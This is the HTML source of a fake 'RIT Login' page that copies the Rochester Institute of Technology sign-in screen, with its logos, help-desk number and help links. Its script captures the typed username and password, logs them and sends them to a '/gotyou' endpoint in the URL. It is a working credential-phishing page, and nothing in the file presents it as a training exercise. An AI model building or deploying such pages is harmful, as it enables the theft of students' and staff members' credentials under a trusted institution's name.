<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>RIT Login</title>
</head>

<body>

    <div class="top-bar"> <img class="top-bar-logo invisable" onload="this.classList.remove('invisable')" src="login-top-bar.png"/></div>
    <div class="login">
        <!-- <img class="logo invisable" onload="this.classList.remove('invisable')" src="login.png"/> -->
        <img class="rit-logo invisable" onload="this.classList.remove('invisable')" src="rit-login-logo.png"/>
        <div class="howisthishelpful">Login to campus.ps.rit.edu</div>
        <form class="form" id="form" action="/gotyou">
            <label>Username</label>
            <input type="text" placeholder="RIT Username" onkeydown='handleEnter(event)'>
            <label>Password</label>
            <input type="text" placeholder="Password" onkeydown='handleEnter(event)'>
        </form>
        <div type="submit" id="submit" class="Login-button" onclick="submit()">Login</div>

        <div class="bottom-stuff">
            <div><a>Forget Username?</a> | <a>Forgot Password?</a></div>
            <a>Change Password</a>
            <div>Need assistance? Please contact the RIT Service Center at</div>
            <div><a>585-575-5000</a> or visit <a>help.rit.edu</a></div>
        </div>
    </div>
    


<script>
function handleEnter(event) {
   if (event.key==="Enter") {
      const form   = document.getElementById('form')
      const submit = document.getElementById('submit')
      const index = [...form].indexOf(event.target);
      try{
        form.elements[index + 1].focus();
      }catch(error){
        submit.click()
      }

      //event.preventDefault();
    }
}
function submit(){
    const form   = document.getElementById('form')
    const index = [...form]
    console.log(index[0].value)
    console.log(index[1].value)
    window.location.href= `/gotyou?username=${index[0].value}&password=${index[1].value}`
}
</script>

</body>
